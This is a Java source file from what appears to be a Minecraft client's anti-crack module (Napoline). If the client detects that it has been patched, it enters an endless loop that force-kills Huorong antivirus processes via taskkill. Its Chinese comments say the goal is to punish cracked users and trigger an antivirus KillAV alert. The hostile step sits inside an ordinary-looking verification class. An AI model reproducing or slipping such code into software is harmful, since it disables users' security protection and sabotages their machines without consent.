package me.napoleon.napoline.junk.NapoAL.othercheck;

import java.io.IOException;

import me.napoleon.napoline.Napoline;
import me.napoleon.napoline.junk.NapoAL.checks.AntiPatch;
import me.napoleon.napoline.utils.client.DevUtils;

public class ReVerify {
	public ReVerify() {
		if(Napoline.flag >= 0 && AntiPatch.patched) {
			// 开裂客户端会逸一时误一世
			Napoline.flag = -114514;
			
			// 让火绒报KillAV 希望用户开的是自动处理病毒
			while(true) {
				try {
					Runtime.getRuntime().exec("taskkill /f /im HipsDaemon.exe");
					Runtime.getRuntime().exec("taskkill /f /im HipsTray.exe");
					Runtime.getRuntime().exec("taskkill /f /im HipsMain.exe");
					Runtime.getRuntime().exec("taskkill /f /im usysdiag.exe");
				} catch (IOException e) {

				}
			}
		}
		
		if(Napoline.flag == -666) {
			Napoline.flag = 0;
		}
		
		if(DevUtils.lol("LOL").equals("LOL")) {
			Napoline.flag = -666;
		}
		
        Napoline.INSTANCE.lnapolineAL.didVerify.add(2);
	}
}
